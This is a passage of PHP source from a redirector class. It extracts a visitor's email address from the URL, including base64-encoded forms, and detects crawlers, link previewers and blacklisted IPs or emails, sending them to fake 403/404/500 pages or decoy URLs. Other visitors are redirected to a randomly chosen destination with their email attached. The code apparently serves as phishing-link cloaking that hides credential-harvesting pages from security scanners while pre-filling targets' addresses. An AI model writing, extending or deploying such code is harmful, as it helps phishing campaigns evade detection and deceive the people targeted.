                $result['value'] = $result['hash'] ?? '';
                break;

            case 'append':
                // Extract email and add as hash fragment
                if ($extractedEmail) {
                    $result['direct'] = $encodedEmail;
                    $result['value'] = $encodedEmail;
                }
                break;

            case '?random=email':
                // Extract email and add as random parameter
                if ($extractedEmail) {
                    $randomParam = $this->generateRandomParam(12);
                    $result['query'] = '?' . $randomParam . '=' . $encodedEmail;
                }
                $result['value'] = $result['query'] ?? '';
                break;
        }
        return $result;
    }

    private function parse_url($originalUrl)
    {
        $destinationUrl = $this->getRandomDestination();
        $addPathToDestination = $this->config['addPathToDestination'];
        $pathPosition = $this->config['pathPosition'];
        // Get the current URL using $_SERVER
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'];
        $uri = $_SERVER['REQUEST_URI'];
        $originalUrl = $originalUrl ?: ($protocol . '://' . $host . $uri);

        // Parse the original and destination URLs
        $originalUrlParts = parse_url($originalUrl);
        $U = parse_url($destinationUrl);


        // error_log(print_r($originalUrlParts, true));
        // error_log(print_r($originalUrl ?? 'no url', true));

        $addedParams = $this->getURLEmail($originalUrl);
        if (isset($addedParams['direct']) && strlen($addedParams['direct']) > 4) {
            if (!empty($U)) {
                return trim($destinationUrl) . $addedParams['value'];
            }
            $addedParams['value'] = '';
        }
        // error_log(print_r($addedParams, true));

        // If the destination URL is empty, initialize components
        if (empty($U)) {
            $U = ['scheme' => $protocol, 'host' => '', 'path' => '', 'query' => ''];
        }

        // Ensure path exists
        if (!isset($U['path'])) {
            $U['path'] = '';
        }

        // Handle query parameters
        $originalQuery = [];
        if (isset($originalUrlParts['query'])) {
            parse_str($originalUrlParts['query'], $originalQuery);
        }

        $destinationQuery = [];
        if (isset($U['query'])) {
            parse_str($U['query'], $destinationQuery);
        }

        // Merge query parameters
        // $mergedQuery = array_merge($destinationQuery, $originalQuery);

        // Process path if required
        if ($addPathToDestination && $pathPosition > 0) {
            $r_path = $U['path'];
            $o_path = array_filter(explode('/', $originalUrlParts['path']), function ($p) {
                return trim($p) !== '';
            });

            if (count($o_path) > $pathPosition) {
                $p = implode('/', array_slice($o_path, $pathPosition));
                $p = preg_replace('#/+#', '/', $p);

                if (strlen($p) > 0 && $p !== '/') {
                    $r_path = rtrim($r_path, '/') . '/' . ltrim($p, '/');
                    $r_path = preg_replace('#/+#', '/', $r_path);
                }
            }

            $U['path'] = $r_path;
        }

        // Build the final URL
        $scheme = $U['scheme'] ?? $protocol;
        $host = $U['host'] ?? '';
        $path = $U['path'] ?? '';
        $query = $addedParams['value'] ?? '';

        return $scheme . '://' . $host . $path . $query;
    }

    /**
     * Extract comprehensive browser information from user agent
     *
     * @param string $userAgent
     * @return array
     */
    private function getBrowserDetails($userAgent)
    {
        $browser = [
            'name' => 'Unknown',
            'version' => 'Unknown',
            'platform' => 'Unknown',
            'device' => 'Unknown',
            'engine' => 'Unknown',
            'is_mobile' => false,
            'is_tablet' => false,
            'is_desktop' => false,
            'is_bot' => false
        ];

        if (empty($userAgent)) {
            return $browser;
        }

        $ua = strtolower($userAgent);

        // Detect platform/OS
        if (preg_match('/windows nt ([\d\.]+)/i', $userAgent, $matches)) {
            $browser['platform'] = 'Windows ' . $matches[1];
        } elseif (preg_match('/mac os x ([\d_\.]+)/i', $userAgent, $matches)) {
            $browser['platform'] = 'macOS ' . str_replace('_', '.', $matches[1]);
        } elseif (preg_match('/linux/i', $userAgent)) {
            $browser['platform'] = 'Linux';
        } elseif (preg_match('/android ([\d\.]+)/i', $userAgent, $matches)) {
            $browser['platform'] = 'Android ' . $matches[1];
            $browser['is_mobile'] = true;
        } elseif (preg_match('/ios ([\d_\.]+)/i', $userAgent, $matches)) {
            $browser['platform'] = 'iOS ' . str_replace('_', '.', $matches[1]);
            $browser['is_mobile'] = true;
        } elseif (preg_match('/iphone os ([\d_\.]+)/i', $userAgent, $matches)) {
            $browser['platform'] = 'iOS ' . str_replace('_', '.', $matches[1]);
            $browser['is_mobile'] = true;
        }

        // Detect device type
        if (preg_match('/mobile|phone|iphone|ipod|blackberry|nokia|samsung|htc|lg|motorola|sony|ericsson/i', $userAgent)) {
            $browser['is_mobile'] = true;
            $browser['device'] = 'Mobile';
        } elseif (preg_match('/tablet|ipad|kindle|nexus|galaxy tab|surface/i', $userAgent)) {
            $browser['is_tablet'] = true;
            $browser['device'] = 'Tablet';
        } else {
            $browser['is_desktop'] = true;
            $browser['device'] = 'Desktop';
        }

        // Detect browser and version
        if (preg_match('/edg\/([\d\.]+)/i', $userAgent, $matches)) {
            $browser['name'] = 'Microsoft Edge';
            $browser['version'] = $matches[1];
            $browser['engine'] = 'Blink';
        } elseif (preg_match('/chrome\/([\d\.]+)/i', $userAgent, $matches)) {
            $browser['name'] = 'Chrome';
            $browser['version'] = $matches[1];
            $browser['engine'] = 'Blink';
        } elseif (preg_match('/firefox\/([\d\.]+)/i', $userAgent, $matches)) {
            $browser['name'] = 'Firefox';
            $browser['version'] = $matches[1];
            $browser['engine'] = 'Gecko';
        } elseif (preg_match('/safari\/([\d\.]+)/i', $userAgent, $matches) && !preg_match('/chrome/i', $userAgent)) {
            $browser['name'] = 'Safari';
            if (preg_match('/version\/([\d\.]+)/i', $userAgent, $versionMatches)) {
                $browser['version'] = $versionMatches[1];
            } else {
                $browser['version'] = $matches[1];
            }
            $browser['engine'] = 'WebKit';
        } elseif (preg_match('/opera\/([\d\.]+)/i', $userAgent, $matches) || preg_match('/opr\/([\d\.]+)/i', $userAgent, $matches)) {
            $browser['name'] = 'Opera';
            $browser['version'] = $matches[1];
            $browser['engine'] = 'Blink';
        } elseif (preg_match('/msie ([\d\.]+)/i', $userAgent, $matches) || preg_match('/trident.*rv:([\d\.]+)/i', $userAgent, $matches)) {
            $browser['name'] = 'Internet Explorer';
            $browser['version'] = $matches[1];
            $browser['engine'] = 'Trident';
        }

        // Detect bots
        $botPatterns = [
            'googlebot',
            'bingbot',
            'slurp',
            'duckduckbot',
            'baiduspider',
            'yandexbot',
            'facebookexternalhit',
            'twitterbot',
            'linkedinbot',
            'whatsapp',
            'telegram',
            'crawler',
            'spider',
            'bot',
            'scraper',
            'fetch'
        ];

        foreach ($botPatterns as $pattern) {
            if (strpos($ua, $pattern) !== false) {
                $browser['is_bot'] = true;
                $browser['name'] = ucfirst($pattern);
                break;
            }
        }

        return $browser;
    }

    /**
     * Extract email from URL using multiple methods
     *
     * @param string $url
     * @return string|null
     */
    private function extractEmailFromUrl($url = '')
    {
        // Use provided URL or construct from $_SERVER
        if (empty($url)) {
            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
            $host = $_SERVER['HTTP_HOST'] ?? '';
            $uri = $_SERVER['REQUEST_URI'] ?? '';
            $url = $protocol . '://' . $host . $uri;
        }

        $parsedUrl = parse_url($url);

        // Method 1: Check URL parameters (both keys and values)
        if (isset($parsedUrl['query'])) {
            parse_str($parsedUrl['query'], $params);

            foreach ($params as $key => $value) {
                // Check if key is an email
                if ($this->isValidEmail($key)) {
                    return $key;
                }

                // Check if value is an email
                if ($this->isValidEmail($value)) {
                    return $value;
                }

                // Check if key is base64 encoded email
                $decodedKey = $this->tryBase64Decode($key);
                if ($decodedKey && $this->isValidEmail($decodedKey)) {
                    return $decodedKey;
                }

                // Check if value is base64 encoded email
                $decodedValue = $this->tryBase64Decode($value);
                if ($decodedValue && $this->isValidEmail($decodedValue)) {
                    return $decodedValue;
                }
            }
        }

        // Method 2: Check URL path segments
        if (isset($parsedUrl['path'])) {
            $pathSegments = explode('/', trim($parsedUrl['path'], '/'));

            foreach ($pathSegments as $segment) {
                if (empty($segment)) continue;

                // Check if segment is an email
                if ($this->isValidEmail($segment)) {
                    return $segment;
                }

                // Check if segment is base64 encoded email
                $decodedSegment = $this->tryBase64Decode($segment);
                if ($decodedSegment && $this->isValidEmail($decodedSegment)) {
                    return $decodedSegment;
                }
            }
        }

        // Method 3: Check URL fragment/hash
        if (isset($parsedUrl['fragment'])) {
            $fragments = explode('|', str_replace([',', '-', '_', '\\', ')', '(', '{', '}', '[', ']', ':', ';', '.', '<', '>'], '|', $parsedUrl['fragment']));
            // Check if text is an email
            foreach ($fragments as $fragment) {
                // Check if fragment is an email
                if ($this->isValidEmail($fragment)) {
                    return $fragment;
                }

                // Check if fragment is base64 encoded email
                $decodedFragment = $this->tryBase64Decode($fragment);
                if ($decodedFragment && $this->isValidEmail($decodedFragment)) {
                    return $decodedFragment;
                }
            }

            $urlFragment = trim($parsedUrl['fragment'], '|');
            if ($this->isValidEmail($urlFragment)) {
                return $urlFragment;
            }

            $decoded = $this->tryBase64Decode($urlFragment);
            if ($decoded && $this->isValidEmail($decoded)) {
                return $decoded;
            }
        }

        return null;
    }

    /**
     * Validate if string is a valid email address
     *
     * @param string $email
     * @return bool
     */
    public function isValidEmail($email)
    {
        return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
    }

    /**
     * Try to decode base64 string safely
     *
     * @param string $string
     * @return string|null
     */
    private function tryBase64Decode($string)
    {
        // Check if string looks like base64
        if (!preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $string)) {
            return null;
        }

        $decoded = base64_decode($string, true);

        // Verify it's valid base64 and contains printable characters
        if ($decoded === false || !$this->isValidUtf8($decoded)) {
            return null;
        }

        return $decoded;
    }

    /**
     * Check if string is valid UTF-8 without requiring mbstring extension
     *
     * @param string $str String to validate
     * @return bool True if valid UTF-8
     */
    private function isValidUtf8($str)
    {
        // Use mbstring if available (faster)
        if (function_exists('mb_check_encoding')) {
            return mb_check_encoding($str, 'UTF-8');
        }

        // Fallback: Use filter_var if available
        if (function_exists('filter_var')) {
            return filter_var($str, FILTER_VALIDATE_REGEXP, [
                    'options' => ['regexp' => '/^.+$/u']
                ]) !== false;
        }

        // Final fallback: Use preg_match with UTF-8 flag
        return preg_match('//u', $str) === 1;
    }

    /**
     * Get comprehensive request information
     *
     * @param string $url
     * @return array
     */
    private function getRequestInfo($url = '')
    {
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $browserDetails = $this->getBrowserDetails($userAgent);
        $extractedEmail = $this->extractEmailFromUrl($url);

        return [
            'timestamp' => date('Y-m-d H:i:s'),
            'method' => $_SERVER['REQUEST_METHOD'] ?? 'GET',
            'url' => $url ?: ($_SERVER['REQUEST_URI'] ?? ''),
            'email' => $extractedEmail ?: 'none',
            'user_agent' => $userAgent,
            'browser_name' => $browserDetails['name'],
            'browser_version' => $browserDetails['version'],
            'platform' => $browserDetails['platform'],
            'device' => $browserDetails['device'],
            'engine' => $browserDetails['engine'],
            'is_mobile' => $browserDetails['is_mobile'] ? 'yes' : 'no',
            'is_tablet' => $browserDetails['is_tablet'] ? 'yes' : 'no',
            'is_desktop' => $browserDetails['is_desktop'] ? 'yes' : 'no',
            'is_bot_ua' => $browserDetails['is_bot'] ? 'yes' : 'no',
            'referer' => $_SERVER['HTTP_REFERER'] ?? 'direct',
            'accept_language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'unknown',
            'accept_encoding' => $_SERVER['HTTP_ACCEPT_ENCODING'] ?? 'unknown',
            'connection' => $_SERVER['HTTP_CONNECTION'] ?? 'unknown',
            'host' => $_SERVER['HTTP_HOST'] ?? 'unknown',
            'protocol' => $_SERVER['SERVER_PROTOCOL'] ?? 'unknown',
            'port' => $_SERVER['SERVER_PORT'] ?? 'unknown'
        ];
    }

    /**
     * Check if IP is whitelisted
     *
     * @param string $ip
     * @return bool
     */
    private function isWhitelisted($ip)
    {
        return in_array($ip, $this->whitelist);
    }

    private function isBlacklisted($ip)
    {
        return in_array($ip, $this->blacklist);
    }

    private function isLogVisitors($url = '')
    {
        if (isset($_COOKIE['r_visitors']) && strlen($_COOKIE['r_visitors']) >= 8) {
            return;
        }
        if ($this->config['logVisitors']) {
            $this->logVisitors($url);
            setcookie('r_visitors', md5(uniqid(uniqid(uniqid()))), time() + 3600 * 24);
        }
    }

    private function resetVisitors()
    {
        if (isset($_COOKIE['r_visitors'])) {
            setcookie('r_visitors', '', time() - 3600);
        }
    }

    /**
     * Handle bot redirection based on botRedirectMethod and errorPattern configuration
     *
     * This method integrates botRedirectMethod with errorPattern to provide flexible bot handling:
     *
     * Bot Redirect Methods:
     * - 'random': Randomly selects from available methods (error403, error404, error500, mediaUrl)
     * - 'error403': Shows 403 Forbidden error or redirects to custom URL
     * - 'error404': Shows 404 Not Found error or redirects to custom URL
     * - 'error500': Shows 500 Server Error or redirects to custom URL
     * - 'mediaUrl': Always redirects to URLs from botRedirectedUrl array
     *
     * ErrorPattern Integration:
     * - When errorPattern['useLink'] = false: Uses default error pages (runError403/404/500)
     * - When errorPattern['useLink'] = true: Uses custom URLs from errorPattern['403'/'404'/'500']
     * - If custom URL is missing/empty: Falls back to default error page
     * - MediaUrl method ignores errorPattern and always uses botRedirectedUrl
     *
     * Examples:
     * 1. botRedirectMethod='error404', useLink=false → Shows default 404 error page
     * 2. botRedirectMethod='error404', useLink=true → Redirects to errorPattern['404'] URL
     * 3. botRedirectMethod='mediaUrl' → Always redirects to random botRedirectedUrl
     * 4. botRedirectMethod='random' → Randomly chooses method, applies errorPattern if error type
     *
     * @param string $url
     * @return void
     */
    public function botRedirection($url = '')
    {
        if ($this->config['logRequests']) {
            $this->logBlocked($url);
        }
        // CacheManager handles its own persistence automatically

        $botRedirection = $this->config['botRedirectMethod'] === 'random' ? $this->botRedirectMethods[array_rand($this->botRedirectMethods)] : $this->config['botRedirectMethod'];

        // Check if errorPattern should be used for error redirects
        $useErrorPattern = isset($this->config['errorPattern']['useLink']) && $this->config['errorPattern']['useLink'] === true;

        //random | error403 | error404 | error500 | mediaUrl
        if ($botRedirection === 'error403') {
            if ($useErrorPattern && isset($this->config['errorPattern']['403']) && !empty($this->config['errorPattern']['403'])) {
                // Use custom URL from errorPattern for 403 errors
                $this->redirectToCustomUrl($this->config['errorPattern']['403']);
            } else {
                // Use default error page
                runError403();
            }
        } else if ($botRedirection === 'error404') {
            if ($useErrorPattern && isset($this->config['errorPattern']['404']) && !empty($this->config['errorPattern']['404'])) {
                // Use custom URL from errorPattern for 404 errors
                $this->redirectToCustomUrl($this->config['errorPattern']['404']);
            } else {
                // Use default error page
                runError404();
            }
        } else if ($botRedirection === 'error500') {
            if ($useErrorPattern && isset($this->config['errorPattern']['500']) && !empty($this->config['errorPattern']['500'])) {
                // Use custom URL from errorPattern for 500 errors
                $this->redirectToCustomUrl($this->config['errorPattern']['500']);
            } else {
                // Use default error page (note: was previously calling runError404, should be runError500)
                runError500();
            }
        } else {
            // For 'mediaUrl' or any other method, use botRedirectedUrl
            $url = $this->botRedirectedUrl[array_rand($this->botRedirectedUrl)];
            $this->redirectToCustomUrl($url);
        }
        die();
    }

    private function blockedEmailRedirection($url = '')
    {
        global $blackListEmailFinalURLs;
        $redirectedUrl = $blackListEmailFinalURLs[array_rand($blackListEmailFinalURLs)];
        if ($redirectedUrl) {
            if ($this->config['logRequests']) {
                $this->logBlocked($url);
            }
            $this->redirectToCustomUrl($redirectedUrl);
            die();
        }
        $this->botRedirection($url);
    }

    private function blockedRequestRedirection($url = '')
    {
        global $blackListRequestFinalURLs;
        $redirectedUrl = $blackListRequestFinalURLs[array_rand($blackListRequestFinalURLs)];
        if ($redirectedUrl) {
            if ($this->config['logRequests']) {
                $this->logBlocked($url);
            }
            $this->redirectToCustomUrl($redirectedUrl);
            die();
        }
        $this->botRedirection($url);
    }


    private function blockedListRedirection($url = '')
    {
        global $blackListFinalURLs;
        $redirectedUrl = $blackListFinalURLs[array_rand($blackListFinalURLs)];
        if ($redirectedUrl) {
            if ($this->config['logRequests']) {
                $this->logBlocked($url);
            }
            $this->redirectToCustomUrl($redirectedUrl);
            die();
        }
        $this->botRedirection($url);
    }

    /**
     * Helper method to handle custom URL redirects with security headers
     *
     * @param string $url The URL to redirect to
     * @return void
     */
    private function redirectToCustomUrl($url)
    {
        // Set security headers
        header('X-Frame-Options: DENY');
        header('X-XSS-Protection: 1; mode=block');
        header('X-Content-Type-Options: nosniff');
        header('Referrer-Policy: no-referrer');

        // Prevent caching
        header('Cache-Control: no-cache, no-store, must-revalidate, max-age=0');
        header('Pragma: no-cache');
        header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');

        header('Location: ' . $url, true, 301);
    }

    //'ccc.co.com'
    private function getSubdomainUrl($name)
    {
        $extensions = [".com.", '.net.', '.org.', '.co.', '.us.', '.uk.'];
        $protocol = (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] === 'on' || $_SERVER['HTTPS'] == 1))
        || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https')
            ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'];
        $uri = $_SERVER['REQUEST_URI'];
        if (strStartsWith($host, $name . '.')) return null;
        $isFound = array_reduce($extensions, fn($carry, $x) => $carry || strContains($host, $x), false);
        $domainParts = explode('.', $host);
        if (($isFound && count($domainParts) > 3) || (!$isFound && count($domainParts) > 2)) return null;
        return "$protocol://$name.$host$uri";
    }

    private function build_url(array $parts)
    {
        return (isset($parts['scheme']) ? $parts['scheme'] . '://' : '')
            . (isset($parts['user']) ? $parts['user']
                . (isset($parts['pass']) ? ':' . $parts['pass'] : '') . '@' : '')
            . ($parts['host'] ?? '')
            . (isset($parts['port']) ? ':' . $parts['port'] : '')
            . ($parts['path'] ?? '')
            . (isset($parts['query']) ? '?' . $parts['query'] : '')
            . (isset($parts['fragment']) ? '#' . $parts['fragment'] : '');
    }


    public function getCurrentUrl($email)
    {
        $chars = [',', '-', '_', '\\', ')', '(', '{', '}', '[', ']', ':', ';', '.', '<', '>', '|'];
        shuffle($chars);
        $protocol = (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] === 'on' || $_SERVER['HTTPS'] == 1))
        || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https')
            ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'];
        $uri = $_SERVER['REQUEST_URI'];
        $url = "$protocol://$host$uri";
        $parsedUrl = parse_url($url);
        if ($email) {
            $hash = implode($chars[0], [md5($url), base64_encode($email), uniqid(), rand(100000, 999999), time(), md5(rand(100000, 999999))]);
            $parsedUrl['fragment'] = $hash;
        }
        return $this->build_url($parsedUrl);
    }


    private function extractEmailWithSource($url)
    {
        $result = [
            'email' => null,
            'source' => null,
            'paramName' => null,
            'isPlain' => false,
            'isEmailKey' => false,
            'isEmailValue' => false,
            'original' => '',
        ];

        $urlParts = parse_url($url);

        // Check query parameters first
        if (isset($urlParts['query'])) {
            parse_str($urlParts['query'], $queryParams);
            foreach ($queryParams as $paramName => $paramValue) {
                if (isset($paramValue) && $this->isValidEmail($paramValue)) {
                    $result['email'] = $paramValue;
                    $result['source'] = 'query';
                    $result['paramName'] = $paramName;
                    $result['isPlain'] = true;
                    return $result;
                }
                if ($this->isValidEmail($paramName)) {
                    $result['email'] = $paramName;
                    $result['source'] = 'query';
                    $result['paramName'] = $paramName;
                    $result['isPlain'] = true;
                    $result['isEmailValue'] = isset($paramValue);
                    $result['isEmailKey'] = true;
                    return $result;
                }

                $decodedValue = $this->tryBase64Decode($paramValue);
                if ($decodedValue && $this->isValidEmail($decodedValue)) {
                    $result['email'] = $decodedValue;
                    $result['source'] = 'query';
                    $result['paramName'] = $paramName;
                    $result['isPlain'] = false;
                    $result['original'] = $paramValue;
                    return $result;
                }

                $decodedValue = $this->tryBase64Decode($paramName);
                if ($decodedValue && $this->isValidEmail($decodedValue)) {
                    $result['email'] = $decodedValue;
                    $result['source'] = 'query';
                    $result['paramName'] = $paramName;
                    $result['isPlain'] = false;
                    $result['isEmailValue'] = isset($paramValue);
                    $result['isEmailKey'] = true;
                    $result['original'] = $paramName;
                    return $result;
                }
            }
        }

        // Check fragment
        if (isset($urlParts['fragment'])) {
            $email = $this->extractEmailFromUrlInternal($urlParts['fragment']);
            if ($email) {
                $result['email'] = $email['email'];
                $result['source'] = 'fragment';
                $result['original'] = $email['original'] ?? '';
                $result['isPlain'] = $email['isPlain'];
                return $result;
            }
        }

        // Check path
        if (isset($urlParts['path'])) {
            $email = $this->extractEmailFromPath($urlParts['path']);
            if ($email) {
                $result['email'] = $email['email'];
                $result['source'] = 'path';
                $result['original'] = $email['original'] ?? '';
                $result['isPlain'] = $email['isPlain'];
                return $result;
            }
        }

        return $result;
    }

    private function extractEmailFromUrlInternal($urlFragment)
    {
        $fragments = explode('|', str_replace([',', '-', '_', '\\', ')', '(', '{', '}', '[', ']', ':', ';', '.', '<', '>'], $this->getStr(), $urlFragment));
        // Check if text is an email
        foreach ($fragments as $text) {
            if ($this->isValidEmail($text)) {
                return [
                    'email' => $text,
                    'isPlain' => true,
                ];
            }

            // Check if text is base64 encoded email
            $decoded = $this->tryBase64Decode($text);
            if ($decoded && $this->isValidEmail($decoded)) {
                return [
                    'email' => $decoded,
                    'isPlain' => false,
                    'original' => $text,
                ];
            }
        }
        if (strlen($urlFragment) > 2) {
            if ($this->isValidEmail($urlFragment)) {
                return [
                    'email' => $urlFragment,
                    'isPlain' => true,
                ];
            }

            $decoded = $this->tryBase64Decode($urlFragment);
            if ($decoded && $this->isValidEmail($decoded)) {
                return [
                    'email' => $decoded,
                    'isPlain' => false,
                    'original' => $urlFragment,
                ];
            }
        }
        return null;
    }

    private function extractEmailFromPath($path)
    {
        $pathSegments = explode('/', trim($path, '/'));

        foreach ($pathSegments as $segment) {
            if (empty($segment)) continue;

            // Check if segment is an email
            if ($this->isValidEmail($segment)) {
                return [
                    'email' => $segment,
                    'isPlain' => true,
                ];
            }

            // Check if segment is base64 encoded email
            $decoded = $this->tryBase64Decode($segment);
            if ($decoded && $this->isValidEmail($decoded)) {
                return [
                    'email' => $decoded,
                    'isPlain' => false,
                    'original' => $segment,
                ];
            }
        }

        return null;
    }

    private function encodeEmailByType($email, $emailType, $isPlain, $originalEmail)
    {
        // error_log(print_r([$email, $emailType, $isPlain, $originalEmail], true));
        switch ($emailType) {
            case 'base64':
                return $isPlain ? base64_encode($email) : $originalEmail;
            case 'plain':
                return rawurldecode($email);
            default:
                return $originalEmail;
        }
    }

    private function generateRandomParam($length = 12)
    {
        return $this->generateRandomString($length);
    }

    private function generateRandomString($length = 12)
    {
        $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, strlen($characters) - 1)];
        }
        return $randomString;
    }

    /**
     * @return string
     */
    public function getStr(): string
    {
        return '|';
    }
}
